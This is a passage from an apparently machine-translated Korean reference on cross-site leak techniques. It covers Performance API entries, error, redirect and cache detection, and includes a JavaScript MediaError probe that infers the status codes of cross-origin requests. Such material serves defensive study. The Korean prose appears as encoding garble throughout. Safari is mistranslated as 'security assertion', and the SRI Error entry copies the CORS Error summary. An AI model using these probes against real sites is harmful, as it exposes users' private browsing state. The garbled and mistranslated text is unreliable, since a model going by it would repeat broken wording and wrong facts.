* **Summary:** ì´ì „ ê¸°ìˆ ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ ëª¨ë“  ì†Œì¼“ì„ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹  Google **Chrome**ì€ **ë™ì¼í•œ ì¶œì²˜ì— ëŒ€í•´ 6ê°œì˜ ë™ì‹œ ìš”ì²­**ìœ¼ë¡œ ì œí•œí•©ë‹ˆë‹¤. ë§Œì•½ ìš°ë¦¬ê°€ **5ê°œë¥¼ ì°¨ë‹¨**í•˜ê³  **6ë²ˆì§¸** ìš”ì²­ì„ ì‹œì‘í•˜ë©´, ì´ë¥¼ **ì‹œê°„ ì¸¡ì •**í•  ìˆ˜ ìˆìœ¼ë©°, **í”¼í•´ì í˜ì´ì§€ê°€ ë™ì¼í•œ ì—”ë“œí¬ì¸íŠ¸ì— ë” ë§ì€ ìš”ì²­ì„ ë³´ë‚´ë„ë¡** ë§Œë“¤ ìˆ˜ ìˆë‹¤ë©´, **6ë²ˆì§¸ ìš”ì²­**ì€ **ë” ì˜¤ë˜ ê±¸ë¦¬ê²Œ** ë˜ì–´ ì´ë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance)ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„±ëŠ¥ ë©”íŠ¸ë¦­ì— ëŒ€í•œ í†µì°°ë ¥ì„ ì œê³µí•˜ë©°, [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API)ë¡œ ë”ìš± í’ë¶€í•´ì§‘ë‹ˆë‹¤. Resource Timing APIëŠ” ìš”ì²­ì˜ ì§€ì† ì‹œê°„ê³¼ ê°™ì€ ìƒì„¸í•œ ë„¤íŠ¸ì›Œí¬ ìš”ì²­ íƒ€ì´ë°ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. íŠ¹íˆ ì„œë²„ê°€ ì‘ë‹µì— `Timing-Allow-Origin: *` í—¤ë”ë¥¼ í¬í•¨í•˜ë©´ ì „ì†¡ í¬ê¸° ë° ë„ë©”ì¸ ì¡°íšŒ ì‹œê°„ê³¼ ê°™ì€ ì¶”ê°€ ë°ì´í„°ê°€ ì œê³µë©ë‹ˆë‹¤.

ì´ í’ë¶€í•œ ë°ì´í„°ëŠ” [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ë˜ëŠ” [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName)ì™€ ê°™ì€ ë©”ì„œë“œë¥¼ í†µí•´ ê²€ìƒ‰í•  ìˆ˜ ìˆìœ¼ë©°, ì„±ëŠ¥ ê´€ë ¨ ì •ë³´ì— ëŒ€í•œ í¬ê´„ì ì¸ ë·°ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ë˜í•œ, APIëŠ” [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)ì—ì„œ ì–»ì€ íƒ€ì„ìŠ¤íƒ¬í”„ì˜ ì°¨ì´ë¥¼ ê³„ì‚°í•˜ì—¬ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Chromeê³¼ ê°™ì€ ë¸Œë¼ìš°ì €ì˜ íŠ¹ì • ì‘ì—…ì— ëŒ€í•´ `performance.now()`ì˜ ì •ë°€ë„ê°€ ë°€ë¦¬ì´ˆë¡œ ì œí•œë  ìˆ˜ ìˆì–´ íƒ€ì´ë° ì¸¡ì •ì˜ ì„¸ë¶„ì„±ì— ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

íƒ€ì´ë° ì¸¡ì • ì™¸ì—ë„ Performance APIëŠ” ë³´ì•ˆ ê´€ë ¨ í†µì°°ë ¥ì„ ìœ„í•´ í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, Chromeì˜ `performance` ê°ì²´ì— í˜ì´ì§€ì˜ ì¡´ì¬ ì—¬ë¶€ëŠ” `X-Frame-Options`ì˜ ì ìš©ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, `X-Frame-Options`ë¡œ ì¸í•´ í”„ë ˆì„ì—ì„œ ë Œë”ë§ì´ ì°¨ë‹¨ëœ í˜ì´ì§€ëŠ” `performance` ê°ì²´ì— ê¸°ë¡ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ í˜ì´ì§€ì˜ í”„ë ˆì´ë° ì •ì±…ì— ëŒ€í•œ ë¯¸ì„¸í•œ ë‹¨ì„œë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ” ìš”ì²­ì€ ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

HTTP ì‘ë‹µ ìƒíƒœ ì½”ë“œë¥¼ **êµ¬ë³„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ë¥˜ë¡œ ì´ì–´ì§€ëŠ” ìš”ì²­ì€ **ì„±ëŠ¥ í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë¸Œë¼ìš°ì € ë²„ê·¸ë¡œ ì¸í•´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ” ìš”ì²­ì´ ë‘ ë²ˆ ë¡œë“œë©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

ì´ì „ ê¸°ìˆ ì—ì„œëŠ” GCì˜ ë¸Œë¼ìš°ì € ë²„ê·¸ë¡œ ì¸í•´ **ë¡œë“œì— ì‹¤íŒ¨í•œ ë¦¬ì†ŒìŠ¤ê°€ ë‘ ë²ˆ ë¡œë“œë˜ëŠ”** ë‘ ê°€ì§€ ê²½ìš°ê°€ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ Performance APIì— ì—¬ëŸ¬ í•­ëª©ì´ ìƒì„±ë˜ë©°, ë”°ë¼ì„œ ì´ë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ” ìš”ì²­ì€ ë³‘í•©ë  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

ì´ ê¸°ìˆ ì€ ì–¸ê¸‰ëœ ë…¼ë¬¸ì˜ í‘œì—ì„œ ë°œê²¬ë˜ì—ˆì§€ë§Œ, ê¸°ìˆ ì— ëŒ€í•œ ì„¤ëª…ì€ ë°œê²¬ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)ì—ì„œ ì´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì†ŒìŠ¤ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë¹ˆ ì‘ë‹µì€ ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

ê³µê²©ìëŠ” ìš”ì²­ì´ ë¹ˆ HTTP ì‘ë‹µ ë³¸ì²´ë¡œ ì´ì–´ì¡ŒëŠ”ì§€ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ **ë¹ˆ í˜ì´ì§€ëŠ” ì¼ë¶€ ë¸Œë¼ìš°ì €ì—ì„œ ì„±ëŠ¥ í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë³´ì•ˆ ì£¼ì¥ì—ì„œ XSS ê°ì‚¬ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬, ê³µê²©ìëŠ” ì¡°ì‘ëœ í˜ì´ë¡œë“œê°€ ê°ì‚¬ê¸°ì˜ í•„í„°ë§ ë©”ì»¤ë‹ˆì¦˜ì„ íŠ¸ë¦¬ê±°í•  ë•Œ ì‘ë‹µì˜ ë³€í™”ë¥¼ ê´€ì°°í•˜ì—¬ íŠ¹ì • ì›¹í˜ì´ì§€ ìš”ì†Œë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

ë³´ì•ˆ ì£¼ì¥(SA)ì—ì„œ XSS ê°ì‚¬ê¸°ëŠ” ì›ë˜ êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆì§€ë§Œ, ì—­ì„¤ì ìœ¼ë¡œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë‚´ì¥ ê¸°ëŠ¥ì€ Google Chrome(GC)ì—ì„œ ì œê±°ë˜ì—ˆì§€ë§Œ, SAì—ëŠ” ì—¬ì „íˆ ì¡´ì¬í•©ë‹ˆë‹¤. 2013ë…„ Braunê³¼ HeiderichëŠ” XSS ê°ì‚¬ê¸°ê°€ í•©ë²•ì ì¸ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìš°ì—°íˆ ì°¨ë‹¨í•˜ì—¬ ì˜ëª»ëœ ê¸ì •ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŒì„ ë³´ì—¬ì£¼ì—ˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë°”íƒ•ìœ¼ë¡œ ì—°êµ¬ìë“¤ì€ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ê³  êµì°¨ ì¶œì²˜ í˜ì´ì§€ì—ì„œ íŠ¹ì • ì½˜í…ì¸ ë¥¼ ê°ì§€í•˜ëŠ” ê¸°ìˆ ì„ ê°œë°œí–ˆìŠµë‹ˆë‹¤. ì´ ê°œë…ì€ XS-Leaksë¡œ ì•Œë ¤ì ¸ ìˆìœ¼ë©°, ì²˜ìŒì—ëŠ” Teradaì— ì˜í•´ ë³´ê³ ë˜ì—ˆê³  Heyesì˜ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì—ì„œ ìì„¸íˆ ì„¤ëª…ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ìˆ ì€ GCì˜ XSS ê°ì‚¬ê¸°ì— íŠ¹ì •í–ˆì§€ë§Œ, SAì—ì„œëŠ” XSS ê°ì‚¬ê¸°ì— ì˜í•´ ì°¨ë‹¨ëœ í˜ì´ì§€ê°€ Performance APIì— í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ë¯¼ê°í•œ ì •ë³´ê°€ ì—¬ì „íˆ ìœ ì¶œë  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** X-Frame-Options í—¤ë”ê°€ ìˆëŠ” ë¦¬ì†ŒìŠ¤ëŠ” ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

í˜ì´ì§€ê°€ **iframe**ì—ì„œ **ë Œë”ë§**ë˜ëŠ” ê²ƒì´ **í—ˆìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°**, ì„±ëŠ¥ í•­ëª©ì„ **ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê²°ê³¼ì ìœ¼ë¡œ ê³µê²©ìëŠ” ì‘ë‹µ í—¤ë” **`X-Frame-Options`**ë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**embed** **íƒœê·¸**ë¥¼ ì‚¬ìš©í•  ë•Œë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤.

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë‹¤ìš´ë¡œë“œëŠ” Performance APIì—ì„œ ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

ì„¤ëª…ëœ XS-Leakì™€ ìœ ì‚¬í•˜ê²Œ, **ContentDisposition** í—¤ë”ë¡œ ì¸í•´ **ë‹¤ìš´ë¡œë“œë˜ëŠ” ë¦¬ì†ŒìŠ¤**ë„ **ì„±ëŠ¥ í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ ê¸°ìˆ ì€ ëª¨ë“  ì£¼ìš” ë¸Œë¼ìš°ì €ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì€ ë¦¬ë””ë ‰ì…˜ì˜ ì‹œì‘ ì‹œê°„ì„ ìœ ì¶œí•©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

ìš°ë¦¬ëŠ” ì¼ë¶€ ë¸Œë¼ìš°ì €ê°€ êµì°¨ ì¶œì²˜ ìš”ì²­ì— ëŒ€í•´ ë„ˆë¬´ ë§ì€ ì •ë³´ë¥¼ ê¸°ë¡í•˜ëŠ” í–‰ë™ì„ ì•…ìš©í•˜ëŠ” XS-Leak ì‚¬ë¡€ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. í‘œì¤€ì€ êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•´ ì„¤ì •í•´ì•¼ í•˜ëŠ” ì†ì„±ì˜ í•˜ìœ„ ì§‘í•©ì„ ì •ì˜í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **SA**ì—ì„œëŠ” ì‚¬ìš©ìê°€ ëŒ€ìƒ í˜ì´ì§€ì— ì˜í•´ **ë¦¬ë””ë ‰ì…˜**ë˜ì—ˆëŠ”ì§€ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **Performance API**ë¥¼ ì¿¼ë¦¬í•˜ê³  **redirectStart timing data**ë¥¼ í™•ì¸í•¨ìœ¼ë¡œì¨ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** ë¦¬ë””ë ‰ì…˜ì´ ë°œìƒí•  ë•Œ íƒ€ì´ë° í•­ëª©ì˜ ì§€ì† ì‹œê°„ì´ ìŒìˆ˜ì…ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GCì—ì„œ **ë¦¬ë””ë ‰ì…˜**ì´ ë°œìƒí•˜ëŠ” ìš”ì²­ì˜ **ì§€ì† ì‹œê°„**ì€ **ìŒìˆ˜**ì´ë©°, ë”°ë¼ì„œ ë¦¬ë””ë ‰ì…˜ì´ ë°œìƒí•˜ì§€ ì•ŠëŠ” ìš”ì²­ê³¼ **êµ¬ë³„**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** CORPë¡œ ë³´í˜¸ëœ ë¦¬ì†ŒìŠ¤ëŠ” ë¦¬ì†ŒìŠ¤ íƒ€ì´ë° í•­ëª©ì„ ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

ì¼ë¶€ ê²½ìš°, **nextHopProtocol entry**ëŠ” ìœ ì¶œ ê¸°ìˆ ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. GCì—ì„œ **CORP header**ê°€ ì„¤ì •ë˜ë©´ nextHopProtocolì€ **ë¹„ì–´ ìˆìŠµë‹ˆë‹¤**. SAëŠ” CORPê°€ í™œì„±í™”ëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•´ ì„±ëŠ¥ í•­ëª©ì„ ì „í˜€ ìƒì„±í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Usage
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** íŠ¹ì • ì¶œì²˜ì— ëŒ€í•´ ì„œë¹„ìŠ¤ ì›Œì»¤ê°€ ë“±ë¡ë˜ì–´ ìˆëŠ”ì§€ ê°ì§€í•©ë‹ˆë‹¤.
* **Code Example**:

ì„œë¹„ìŠ¤ ì›Œì»¤ëŠ” ì¶œì²˜ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì´ë²¤íŠ¸ ê¸°ë°˜ ìŠ¤í¬ë¦½íŠ¸ ì»¨í…ìŠ¤íŠ¸ì…ë‹ˆë‹¤. ì´ë“¤ì€ ì›¹ í˜ì´ì§€ì˜ ë°±ê·¸ë¼ìš´ë“œì—ì„œ ì‹¤í–‰ë˜ë©°, ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ë¡œì±„ê³  ìˆ˜ì •í•˜ë©° **ì˜¤í”„ë¼ì¸ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜**ì„ ë§Œë“¤ê¸° ìœ„í•´ ë¦¬ì†ŒìŠ¤ë¥¼ ìºì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**iframe**ì„ í†µí•´ **ì„œë¹„ìŠ¤ ì›Œì»¤**ì— ì˜í•´ **ìºì‹œëœ ë¦¬ì†ŒìŠ¤**ì— ì ‘ê·¼í•˜ë©´, ë¦¬ì†ŒìŠ¤ëŠ” **ì„œë¹„ìŠ¤ ì›Œì»¤ ìºì‹œ**ì—ì„œ **ë¡œë“œë©ë‹ˆë‹¤**.\
ë¦¬ì†ŒìŠ¤ê°€ **ì„œë¹„ìŠ¤ ì›Œì»¤** ìºì‹œì—ì„œ **ë¡œë“œë˜ì—ˆëŠ”ì§€ ê°ì§€í•˜ê¸° ìœ„í•´ Performance APIë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì€ íƒ€ì´ë° ê³µê²©ìœ¼ë¡œë„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ìì„¸í•œ ë‚´ìš©ì€ ë…¼ë¬¸ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** ë¦¬ì†ŒìŠ¤ê°€ ìºì‹œì— ì €ì¥ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performance API](./#performance-api)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¦¬ì†ŒìŠ¤ê°€ ìºì‹œë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** `performance` APIì—ì„œ ìš”ì²­ì˜ ë„¤íŠ¸ì›Œí¬ ì§€ì† ì‹œê°„ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Firefoxì—ì„œ êµì°¨ ì¶œì²˜ ìš”ì²­ì˜ ìƒíƒœ ì½”ë“œë¥¼ ì •í™•í•˜ê²Œ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` ì¸í„°í˜ì´ìŠ¤ì˜ message ì†ì„±ì€ ì„±ê³µì ìœ¼ë¡œ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ë¥¼ ê³ ìœ í•˜ê²Œ ì‹ë³„í•˜ëŠ” ë…íŠ¹í•œ ë¬¸ìì—´ì„ ì œê³µí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ ë©”ì‹œì§€ ë‚´ìš©ì„ ê´€ì°°í•¨ìœ¼ë¡œì¨ êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ì˜ ì‘ë‹µ ìƒíƒœë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CORS ì˜¤ë¥˜

* **í¬í•¨ ë°©ë²•**: Fetch API
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **ìš”ì•½:** ë³´ì•ˆ ì£¼ì¥(SA)ì—ì„œ CORS ì˜¤ë¥˜ ë©”ì‹œì§€ëŠ” ìš°ì—°íˆ ë¦¬ë””ë ‰ì…˜ëœ ìš”ì²­ì˜ ì „ì²´ URLì„ ë…¸ì¶œí•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

ì´ ê¸°ìˆ ì€ ê³µê²©ìê°€ **êµì°¨ ì¶œì²˜ ì‚¬ì´íŠ¸ì˜ ë¦¬ë””ë ‰ì…˜ ëª©ì ì§€ë¥¼ ì¶”ì¶œ**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” Webkit ê¸°ë°˜ ë¸Œë¼ìš°ì €ê°€ CORS ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì„ ì´ìš©í•˜ì—¬ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ, **CORS ì§€ì› ìš”ì²­**ì´ ì‚¬ìš©ì ìƒíƒœì— ë”°ë¼ ë¦¬ë””ë ‰ì…˜ì„ ë°œí–‰í•˜ëŠ” ëŒ€ìƒ ì‚¬ì´íŠ¸ì— ì „ì†¡ë˜ê³  ë¸Œë¼ìš°ì €ê°€ ìš”ì²­ì„ ê±°ë¶€í•˜ë©´, **ë¦¬ë””ë ‰ì…˜ì˜ ëŒ€ìƒ URL ì „ì²´**ê°€ ì˜¤ë¥˜ ë©”ì‹œì§€ ë‚´ì— ë…¸ì¶œë©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ë¦¬ë””ë ‰ì…˜ì˜ ì‚¬ì‹¤ì„ ë“œëŸ¬ë‚¼ ë¿ë§Œ ì•„ë‹ˆë¼ ë¦¬ë””ë ‰ì…˜ì˜ ì—”ë“œí¬ì¸íŠ¸ì™€ í¬í•¨ë  ìˆ˜ ìˆëŠ” **ë¯¼ê°í•œ ì¿¼ë¦¬ ë§¤ê°œë³€ìˆ˜**ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤.

### SRI ì˜¤ë¥˜

* **í¬í•¨ ë°©ë²•**: Fetch API
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: í—¤ë”
* **ìì„¸í•œ ì •ë³´**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **ìš”ì•½:** ë³´ì•ˆ ì£¼ì¥(SA)ì—ì„œ CORS ì˜¤ë¥˜ ë©”ì‹œì§€ëŠ” ìš°ì—°íˆ ë¦¬ë””ë ‰ì…˜ëœ ìš”ì²­ì˜ ì „ì²´ URLì„ ë…¸ì¶œí•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

